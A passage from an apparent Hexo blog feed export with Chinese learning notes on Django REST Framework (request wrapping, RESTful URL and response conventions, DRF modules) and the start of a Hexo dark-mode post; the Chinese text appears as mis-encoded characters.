data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVxdWVzdHMv">API Guild - Requests<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨`APIView`ç±»çš„`dispatch`æ–¹æ³•ä¸­ï¼ŒäºŒæ¬¡å°è£…request (è¯·æ±‚æ¨¡å—)</span></span><br><span class="line">request = self.initialize_request(request, *args, **kwargs)   <span class="comment">#ç‚¹è¿›å»</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç‚¹å‡»æŸ¥çœ‹Requestæºç </span></span><br><span class="line"><span class="keyword">return</span> Request(</span><br><span class="line">ã€€ã€€request,</span><br><span class="line">ã€€ã€€...</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨rest_framework.request.Requestå®ä¾‹åŒ–æ–¹æ³•ä¸­</span></span><br><span class="line">self._request = request         <span class="comment">#å°†åŸç”Ÿrequestä½œä¸ºdrf requestçš„_requestå±æ€§</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨rest_framework.request.Requestçš„__getattr__æ–¹æ³•ä¸­</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">return</span> getattr(self._request, attr)  <span class="comment"># è®¿é—®å±æ€§å®Œå…¨å…¼å®¹åŸç”Ÿrequest</span></span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="keyword">return</span> self.__getattribute__(attr)</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol><li>drf å¯¹åŸç”Ÿ<code>request</code>åšäº†äºŒæ¬¡å°è£…ï¼Œè®¾ç½®<code>request._request</code>ç­‰äºåŸç”Ÿ<code>request</code></li><li>åŸç”Ÿ<code>request</code>å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•éƒ½å¯ä»¥è¢«drfçš„<code>request</code>å¯¹è±¡ç›´æ¥è®¿é—®(å…¼å®¹)</li><li>drfè¯·æ±‚çš„æ‰€æœ‰urlæ‹¼æ¥å‚æ•°å‡è¢«è§£æåˆ°<code>query_params</code>ä¸­ï¼Œæ‰€æœ‰æ•°æ®åŒ…æ•°æ®éƒ½è¢«<code>parser</code>è§£æåˆ°<code>data</code>ä¸­<ul><li>getè¯·æ±‚ï¼šurlä¸­æ‹¼æ¥çš„å‚æ•°é€šè¿‡<code>request.query_params</code>è·å–</li><li>postè¯·æ±‚ï¼šæ‰€æœ‰è¯·æ±‚æ–¹å¼æ‰€æºå¸¦çš„æ•°æ®åŒ…éƒ½æ˜¯é€šè¿‡<code>request.data</code>è·å–</li></ul></li></ol><h2 id="ç”¨æ³•ç¤ºä¾‹"><a href="#ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="ç”¨æ³•ç¤ºä¾‹"></a>ç”¨æ³•ç¤ºä¾‹</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># urlæ‹¼æ¥çš„å‚æ•°</span></span><br><span class="line">        print(request._request.GET)  <span class="comment"># äºŒæ¬¡å°è£…æ–¹å¼</span></span><br><span class="line">        print(request.GET) <span class="comment"># å…¼å®¹</span></span><br><span class="line">        print(request.query_params) <span class="comment"># æ‹“å±•</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf get ok'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># æ‰€æœ‰è¯·æ±‚æ–¹å¼æºå¸¦çš„æ•°æ®åŒ…</span></span><br><span class="line">        print(request._request.POST)  <span class="comment"># äºŒæ¬¡å°è£…æ–¹å¼</span></span><br><span class="line">        print(request.POST)  <span class="comment"># å…¼å®¹</span></span><br><span class="line">        print(request.data)  <span class="comment"># æ‹“å±•ï¼Œå…¼å®¹æ€§æœ€å¼ºï¼Œä¸‰ç§ä¼ å‚æ–¹å¼éƒ½å¯ä»¥ï¼šform-data,urlencoding,json</span></span><br><span class="line"></span><br><span class="line">        print(request.query_params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'drf post ok'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰ï¼šRESTful API åˆæ¢</title>
      <link href="/tech/drf-learning-notes-1-hello-restful-api/"/>
      <url>/tech/drf-learning-notes-1-hello-restful-api/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (1): Hello RESTful API</strong></em></li><li>Author: dog2</li></ul><hr><blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>å‰åç«¯åˆ†ç¦»æ˜¯å¤§åŠ¿æ‰€è¶‹</p>            <i class="fa fa-quote-right"></i>          </blockquote><h1 id="æŒ‰"><a href="#æŒ‰" class="headerlink" title="æŒ‰"></a>æŒ‰</h1><p>æœ€è¿‘åœ¨å­¦ä¹ Django Rest Frameworkï¼Œ<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy90dXRvcmlhbC9xdWlja3N0YXJ0Lw==">å®˜æ–¹æ•™ç¨‹<i class="fa fa-external-link-alt"></i></span>è¾ƒçŸ­ï¼Œçœ‹å®Œæ„Ÿè§‰å¹¶æ²¡æœ‰å­¦ä¹ åˆ°æœ€ä½³å®è·µï¼Œå¯¹DRFçš„äº†è§£è¿˜æ˜¯ä¸æˆä½“ç³»ã€‚<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVxdWVzdHMv">å®˜æ–¹APIæ–‡æ¡£<i class="fa fa-external-link-alt"></i></span>è™½ç„¶è¯¦ç»†ä¸€äº›ï¼Œä½†å†…å®¹å¤šä¸”é›¶æ•£æ›´é€‚åˆæŸ¥é˜…ï¼Œå¯¹äºç³»ç»Ÿæ€§å­¦ä¹ æ¥è¯´è¿˜æ˜¯å·®äº†ä¸€ç‚¹ã€‚</p><p>äºæ˜¯æ‰¾åˆ°äº†<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW5FNDExSjdoeA==">ä¸€å¥—ä¸é”™çš„DRFæºç åˆ†æè§†é¢‘<i class="fa fa-external-link-alt"></i></span>æ¥å­¦ä¹ ï¼Œå¹¶ä¸”åœ¨è¿™é‡Œè®°ä¸‹å­¦ä¹ ç¬”è®°ã€‚</p><p>å‚è€ƒäº†è¿™ä¸¤ä½åŒå­¦çš„ç¬”è®°ï¼Œå¤§éƒ¨åˆ†æ˜¯è§†é¢‘è®²å¸ˆåœ¨è§†é¢‘é‡Œåšè¿‡çš„è¯¾å ‚ç¬”è®°ã€‚</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2FuZ2N1aWNhbi9jYXRlZ29yeS8xNjA3ODIyLmh0bWw=">éšç¬”åˆ†ç±» - Django REST frameworkç¬”è®°<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWFuZ2ppYW9zaG91L2NhdGVnb3J5LzE2NzUwMjEuaHRtbA==">éšç¬”åˆ†ç±» - Djangoâ€“drfç›¸å…³ <i class="fa fa-external-link-alt"></i></span></li></ul><p>æ ¹æ®æˆ‘ä¸ªäººç†è§£å¯¹ç¬”è®°åšäº†éƒ¨åˆ†ä¿®æ”¹ã€æ•´ç†å’Œè¡¥å……ã€‚è¿™é‡Œæœ‰æˆ‘çš„<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZg==">æµ‹è¯•ä»£ç <i class="fa fa-external-link-alt"></i></span>å¯ä¾›å‚è€ƒï¼ŒåŒ…æ‹¬djangoé¡¹ç›®ã€dbæ•°æ®å’Œpostmançš„æµ‹è¯•æ•°æ®åŒ…ã€‚</p><h1 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h1><ul><li><strong><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU4JUExJUE4JUU3JThFJUIwJUU1JUIxJTgyJUU3JThBJUI2JUU2JTgwJTgxJUU4JUJEJUFDJUU2JThEJUEy">RESTful<i class="fa fa-external-link-alt"></i></span></strong>: Representational State Transfer è¡¨ç°å±‚çŠ¶æ€è½¬æ¢</li><li><strong>ful</strong>: å½¢å®¹è¯åç¼€ï¼Œè¡¨ç¤ºâ€œï¼ˆè¿™ä¸€ï¼‰ç±»çš„ã€ï¼ˆè¿™ç§ï¼‰é£æ ¼çš„â€</li><li><strong><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWNuLyVFNSVCQSU5NCVFNyU5NCVBOCVFNyVBOCU4QiVFNSVCQSU4RiVFNiU4RSVBNSVFNSU4RiVBMw==">API<i class="fa fa-external-link-alt"></i></span></strong>: Application Programming Interface åº”ç”¨ç¨‹åºæ¥å£</li><li><strong>æ¥å£</strong>ï¼šè”ç³»ä¸¤ä¸ªç‰©è´¨çš„åª’ä»‹ï¼Œå®Œæˆä¿¡æ¯äº¤äº’</li><li><strong>Webç¨‹åºæ¥å£</strong><ul><li>åŠŸèƒ½ï¼šè”ç³»å‰å°é¡µé¢ä¸åå°æ•°æ®åº“çš„åª’ä»‹</li><li>ç»„æˆ<ul><li>url: é•¿å¾—åƒè¿”å›æ•°æ®çš„urlé“¾æ¥</li><li>è¯·æ±‚å‚æ•°: å‰å°æŒ‰ç…§æŒ‡å®šçš„keyæä¾›æ•°æ®ç»™åå°</li><li>å“åº”æ•°æ®: åå°ä¸æ•°æ®åº“äº¤äº’åå°†æ•°æ®åé¦ˆç»™å‰å°</li></ul></li></ul></li></ul><a id="more"></a><h1 id="RESTful-API"><a href="#RESTful-API" class="headerlink" title="RESTful API"></a>RESTful API</h1><h2 id="æ¥å£è§„èŒƒ"><a href="#æ¥å£è§„èŒƒ" class="headerlink" title="æ¥å£è§„èŒƒ"></a>æ¥å£è§„èŒƒ</h2><ul><li>åŠŸèƒ½ï¼šä¸ºäº†é‡‡ç”¨ä¸åŒçš„åå°è¯­è¨€ï¼Œä¹Ÿèƒ½ä½¿ç”¨åŒæ ·çš„æ¥å£ï¼Œè·å–åˆ°åŒæ ·çš„æ•°æ®</li><li>æ¥å£ï¼š<ul><li>url</li><li>ç›¸åº”æ•°æ®</li></ul></li><li>æ¥å£æ–‡æ¡£ï¼š<ul><li>url + è¯·æ±‚å‚æ•°</li><li>å“åº”æ•°æ®</li></ul></li></ul><h2 id="URLè§„èŒƒ"><a href="#URLè§„èŒƒ" class="headerlink" title="URLè§„èŒƒ"></a>URLè§„èŒƒ</h2><p>RESFful APIçš„URLåº”åŒ…å«å¦‚ä¸‹éƒ¨åˆ†ï¼š</p><h3 id="ç”¨apiå…³é”®å­—æ ‡è¯†æ¥å£url"><a href="#ç”¨apiå…³é”®å­—æ ‡è¯†æ¥å£url" class="headerlink" title="ç”¨apiå…³é”®å­—æ ‡è¯†æ¥å£url"></a>ç”¨apiå…³é”®å­—æ ‡è¯†æ¥å£url</h3><p>å¦‚</p><ul><li>api.baidu.com</li><li><span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb20vYXBp">www.baidu.com/api<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="ä¼˜å…ˆé€‰æ‹©httpsåè®®"><a href="#ä¼˜å…ˆé€‰æ‹©httpsåè®®" class="headerlink" title="ä¼˜å…ˆé€‰æ‹©httpsåè®®"></a>ä¼˜å…ˆé€‰æ‹©httpsåè®®</h3><p>æ¥å£æ•°æ®å®‰å…¨æ€§è€ƒé‡</p><h3 id="ç‰ˆæœ¬æ ‡è¯†"><a href="#ç‰ˆæœ¬æ ‡è¯†" class="headerlink" title="ç‰ˆæœ¬æ ‡è¯†"></a>ç‰ˆæœ¬æ ‡è¯†</h3><p>å¦‚</p><ul><li>api.baidu.com/v1/â€¦</li><li>api.baidu.com/v2/â€¦</li></ul><h3 id="èµ„æº"><a href="#èµ„æº" class="headerlink" title="èµ„æº"></a>èµ„æº</h3><p>æ¥å£æ“ä½œçš„æ•°æ®å¯¹è±¡ï¼Œåœ¨urlä¸­ä¸€èˆ¬é‡‡ç”¨èµ„æºï¼ˆåè¯ï¼‰å¤æ•°å½¢å¼ã€‚ä¸€ä¸ªæ¥å£å¯ä»¥åŒ…å«å¯¹è¯¥èµ„æºçš„å¤šç§æ“ä½œæ–¹å¼ã€‚å¦‚</p><ul><li>api.baidu.com/books</li><li>api.baidu.com/books/(pk)</li></ul><h3 id="è¯·æ±‚æ–¹æ³•"><a href="#è¯·æ±‚æ–¹æ³•" class="headerlink" title="è¯·æ±‚æ–¹æ³•"></a>è¯·æ±‚æ–¹æ³•</h3><p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSFRUUC9NZXRob2Rz">HTTPè¯·æ±‚æ–¹æ³•<i class="fa fa-external-link-alt"></i></span>ï¼Œæ ‡è¯†æ“ä½œèµ„æºçš„æ–¹å¼ï¼Œå¦‚</p><ul><li><code>GET /books/</code> &amp; <code>GET /books/(pk)</code>: è·å–æ‰€æœ‰/è·å–ä¸€ä¸ª</li><li><code>POST /books/</code>: å¢åŠ ä¸€ä¸ª(å¤šä¸ª)</li><li><code>DELETE /books/(pk)</code>: åˆ é™¤ä¸€ä¸ª</li><li><code>PUT /books/(pk)</code>: æ•´ä½“æ›´æ–°ä¸€ä¸ª</li><li><code>PATCH /books/(pk)</code>: å±€éƒ¨æ›´æ–°ä¸€ä¸ª</li></ul><h3 id="è¯·æ±‚å‚æ•°"><a href="#è¯·æ±‚å‚æ•°" class="headerlink" title="è¯·æ±‚å‚æ•°"></a>è¯·æ±‚å‚æ•°</h3><p>å¾€å¾€æ¶‰åŠæ•°æ®çš„å„ç§è¿‡æ»¤æ“ä½œåŠè¡¨ç°å½¢å¼ - ç­›é€‰ã€æ’åºã€é™åˆ¶ï¼Œå¦‚</p><ul><li>api.baidu.com/books/?search=è¥¿&amp;ordering=-price&amp;limit=3</li></ul><h2 id="å“åº”æ•°æ®"><a href="#å“åº”æ•°æ®" class="headerlink" title="å“åº”æ•°æ®"></a>å“åº”æ•°æ®</h2><p>APIè¿”å›çš„æ•°æ®ï¼Œä¸€èˆ¬ä¸ºJsonæ ¼å¼ï¼Œå¦‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">"errcode"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"Query success."</span>,</span><br><span class="line">    <span class="attr">"body"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">"location"</span>: <span class="string">"116.298457,39.848625"</span>,</span><br><span class="line">            <span class="attr">"radius"</span>: <span class="number">41</span>,</span><br><span class="line">            <span class="attr">"country"</span>: <span class="string">"ä¸­å›½"</span>,</span><br><span class="line">            <span class="attr">"province"</span>: <span class="string">"åŒ—äº¬å¸‚"</span>,</span><br><span class="line">            <span class="attr">"city"</span>: <span class="string">"åŒ—äº¬å¸‚"</span>,</span><br><span class="line">            <span class="attr">"citycode"</span>: <span class="string">"131"</span>,</span><br><span class="line">            <span class="attr">"district"</span>: <span class="string">"ä¸°å°åŒº"</span>,</span><br><span class="line">            <span class="attr">"road"</span>: <span class="string">"ä¸°å°å—è·¯44å·"</span>,</span><br><span class="line">            <span class="attr">"ctime"</span>: <span class="string">"1551178833"</span>,</span><br><span class="line">            <span class="attr">"indoor"</span>: <span class="string">"1"</span>,</span><br><span class="line">            <span class="attr">"error"</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>å“åº”çŠ¶æ€ç ï¼šç”±å¼€å‘è€…ï¼ˆå‰ç«¯ã€åç«¯ã€å®¢æˆ·ï¼‰å®šä¹‰ï¼Œæ˜¯å¯¹èµ„æºè¯·æ±‚ç»“æœçš„åº”ç”¨å±‚çŠ¶æ€ç ï¼ŒéHTTPå“åº”çŠ¶æ€ç ã€‚<ul><li>å¸¸è§å­—æ®µåç¤ºä¾‹ï¼š<ul><li><code>&quot;status&quot;</code></li><li><code>&quot;errcode&quot;</code></li></ul></li><li>å¸¸è§å€¼ç¤ºä¾‹ï¼š<ul><li><code>0</code>: è¡¨ç¤ºæ“ä½œèµ„æºæˆåŠŸ</li><li><code>1</code>: è¡¨ç¤ºæ“ä½œèµ„æºå¤±è´¥</li><li><code>2</code>: è¡¨ç¤ºæ“ä½œèµ„æºæˆåŠŸï¼Œä½†æ²¡åŒ¹é…ç»“æœ</li></ul></li></ul></li><li>å“åº”çŠ¶æ€ç æ–‡å­—è¯´æ˜<ul><li>å¸¸è§å­—æ®µåç¤ºä¾‹<ul><li><code>&quot;msg&quot;</code></li><li><code>&quot;message&quot;</code></li></ul></li></ul></li><li>èµ„æºæœ¬èº« <ul><li>å¸¸è§å­—æ®µåç¤ºä¾‹<ul><li><code>&quot;data&quot;</code></li><li><code>&quot;results&quot;</code></li></ul></li></ul></li></ol><p>æ³¨æ„ï¼šä¸èƒ½ç›´æ¥è¿”å›çš„èµ„æº(å­èµ„æºã€å›¾ç‰‡ã€è§†é¢‘ç­‰èµ„æº)ï¼Œè€Œæ˜¯è¿”å›è¯¥èµ„æºçš„urlé“¾æ¥</p><h1 id="åŸºäºrestfulè§„èŒƒçš„åŸç”ŸDjangoæ¥å£"><a href="#åŸºäºrestfulè§„èŒƒçš„åŸç”ŸDjangoæ¥å£" class="headerlink" title="åŸºäºrestfulè§„èŒƒçš„åŸç”ŸDjangoæ¥å£"></a>åŸºäºrestfulè§„èŒƒçš„åŸç”ŸDjangoæ¥å£</h1><p>æµ‹è¯•ä»£ç åŠæ•°æ®è¯·å‚è§ <a href="https://github.com/dog-2/hello_drf/tree/master/no1_my_restapi" target="_blank" rel="noopener">demoé¡¹ç›® <code>no1_my_restapi</code></a></p><div class="note warning">            <p>åŸç”Ÿæ¥å£å¯¹<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdqdW41MTU5L2FydGljbGUvZGV0YWlscy80Nzc4MTQ0Mw==">å„ç§æ ¼å¼çš„POSTæ•°æ®<i class="fa fa-external-link-alt"></i></span>çš„æ”¯æŒæƒ…å†µå¦‚ä¸‹ï¼š</p><ul><li><input checked="" disabled="" type="checkbox"> form-data</li><li><input checked="" disabled="" type="checkbox"> x-www-form-urlencoded</li><li><input disabled="" type="checkbox"> <del>rawï¼šåŒ…æ‹¬ å¸¸è§çš„jsonã€xmlç­‰</del></li></ul><p>ä¹Ÿå°±æ˜¯è¯´ <strong>åŸç”Ÿæ¥å£å¹¶ä¸æ”¯æŒå¯¹POSTè¯·æ±‚ä¸­jsonæ•°æ®çš„è‡ªåŠ¨è§£æï¼Œåç«¯åªèƒ½æ‹¿åˆ°æ•´ä¸ªjsonå­—ç¬¦ä¸²</strong></p>          </div><h1 id="DRF-Django-REST-Framework"><a href="#DRF-Django-REST-Framework" class="headerlink" title="DRF - Django REST Framework"></a>DRF - Django REST Framework</h1><p>DRFæœ‰å¦‚ä¸‹ä¸»è¦æ¨¡å—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView, ...                      <span class="comment"># è§†å›¾æ¨¡å— - å¯¹djangoåŸç”Ÿè§†å›¾ç±»çš„å°è£…</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response, ...                  <span class="comment"># å“åº”æ¨¡å— - å¯¹djangoåŸç”Ÿå“åº”ç±»çš„å°è£…</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.request <span class="keyword">import</span> Request, ...                    <span class="comment"># è¯·æ±‚æ¨¡å— - å¯¹djangoåŸç”Ÿè¯·æ±‚ç±»çš„å°è£…</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> Serializer, ...             <span class="comment"># åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¨¡å—</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.settings <span class="keyword">import</span> APISettings                    <span class="comment"># DRFçš„é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> SearchFilter, ...               <span class="comment"># RESTful API åŸºç¡€åŠŸèƒ½ - è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.pagination <span class="keyword">import</span> PageNumberPagination, ...    <span class="comment"># RESTful API åŸºç¡€åŠŸèƒ½ - åˆ†é¡µ</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.authentication <span class="keyword">import</span> TokenAuthentication, ... <span class="comment"># RESTful API åŸºç¡€åŠŸèƒ½ - è®¤è¯</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated, ...        <span class="comment"># RESTful API åŸºç¡€åŠŸèƒ½ - æƒé™ï¼ˆæ˜¯å¦ç™»å½•ï¼‰</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.throttling <span class="keyword">import</span> SimpleRateThrottle           <span class="comment"># RESTful API åŸºç¡€åŠŸèƒ½ - é¢‘ç‡</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° DRF åœ¨ djangoåŸæœ‰åŸºç¡€ä¸Šè¿›è¡Œç±»å°è£…ï¼Œå¹¶å®ç°ç±» RESTful APIçš„å„å¤§åŸºç¡€åŠŸèƒ½ã€‚</p><p>åŸç”ŸViewä¸åŒï¼ŒDRFå®ç°äº†å¯¹jsonæ ¼å¼çš„POSTè¯·æ±‚æ•°æ®çš„è‡ªåŠ¨è§£æï¼š</p><ul><li><input checked="" disabled="" type="checkbox"> form-data</li><li><input checked="" disabled="" type="checkbox"> x-www-form-urlencoded</li><li><input checked="" disabled="" type="checkbox"> rawï¼šåŒ…æ‹¬ å¸¸è§çš„jsonã€xmlç­‰</li></ul><h1 id="æ‰©å±•é˜…è¯»"><a href="#æ‰©å±•é˜…è¯»" class="headerlink" title="æ‰©å±•é˜…è¯»"></a>æ‰©å±•é˜…è¯»</h1><ul><li><strong><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVzdGFwaXR1dG9yaWFsLmNvbS8=">A RESTful Tutorial<i class="fa fa-external-link-alt"></i></span></strong></li><li><strong>API Design Cheat Sheet</strong>: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Jlc3RDaGVhdFNoZWV0L2FwaS1jaGVhdC1zaGVldC9ibG9iL21hc3Rlci9SRUFETUUtemgtSGFucy5tZA==">ä¸­æ–‡<i class="fa fa-external-link-alt"></i></span> / <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Jlc3RDaGVhdFNoZWV0L2FwaS1jaGVhdC1zaGVldCNhcGktZGVzaWduLWNoZWF0LXNoZWV0">EN<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2RyZi5qaXV5b3UuaW5mby8jLw==">DRF API æŒ‡å—<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9xMW1pLmdpdGh1Yi5pby9EamFuZ28tUkVTVC1mcmFtZXdvcmstZG9jdW1lbnRhdGlvbi8=">DRF å®˜æ–¹æ–‡æ¡£ï¼ˆå†å²ç‰ˆæœ¬ï¼‰ä¸­æ–‡ç¿»è¯‘<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NyaWZhbi9odHRwX3Jlc3RmdWxfYXBp">HTTPåå°ç«¯ï¼šRESTful APIæ¥å£è®¾è®¡<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoï¼ˆNextä¸»é¢˜ï¼‰å®ç°å¯åˆ‡æ¢çš„Dark Mode(æš—è‰²èƒŒæ™¯/å¤œé—´æ¨¡å¼)</title>
      <link href="/tech/hexo-dark-mode-note/"/>
      <url>/tech/hexo-dark-mode-note/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Hexo Dark Mode Note</strong></em></li><li>Author: dog2</li></ul><hr><blockquote><p>Dark Mode â€”â€” ä¸­è€å¹´ç¨‹åºğŸ¶çš„çœ¼ç›ç»­å‘½å¿…å¤‡åŠŸèƒ½</p></blockquote><p>Macã€Win çº·çº·æ¨å‡ºäº† Dark Modeï¼Œå®‰å“ä¹ŸåŸç”Ÿæ”¯æŒäº†éšç€å¤œå¹•é™ä¸´è‡ªåŠ¨è°ƒæ•´å±å¹•äº®åº¦ï¼ˆè“å…‰ï¼‰çš„åŠŸèƒ½ï¼Œçœ‹æ¥ä¿æŠ¤çœ¼ç›ã€å…³çˆ±ç¨‹åºçŒ¿æ˜¯å¤§åŠ¿æ‰€è¶‹ã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬å°è¯•äº†3ç§ä½¿Hexo Nextä¸»é¢˜åˆ‡æ¢ä¸ºdarkmodeçš„æ–¹å¼ã€‚</p><a id="more"></a><h1 id="æ–¹æ¡ˆ1ï¼šå®˜æ–¹æœ€æ–°ç‰ˆNext"><a href="#æ–¹æ¡ˆ1ï¼šå®˜æ–¹æœ€æ–°ç‰ˆNext" class="headerlink" title="æ–¹æ¡ˆ1ï¼šå®˜æ–¹æœ€æ–°ç‰ˆNext"></a>æ–¹æ¡ˆ1ï¼šå®˜æ–¹æœ€æ–°ç‰ˆNext</h1><p>Nextåœ¨æœ€è¿‘çš„å‡ ä¸ªç‰ˆæœ¬çš„æ›´æ–°ä¸­<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L3B1bGwvMTM4Ng==">åŠ å…¥äº†å¯¹darkmodeçš„åŸç”Ÿæ”¯æŒ<i class="fa fa-external-link-alt"></i></span>ï¼Œé…ç½®éå¸¸ç®€å•ã€‚</p><ul><li>é…ç½®æ–¹æ³•ï¼šå‚è§ <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9pbmRleC5odG1sI0RhcmstTW9kZQ==">å®˜æ–¹æ–‡æ¡£<i class="fa 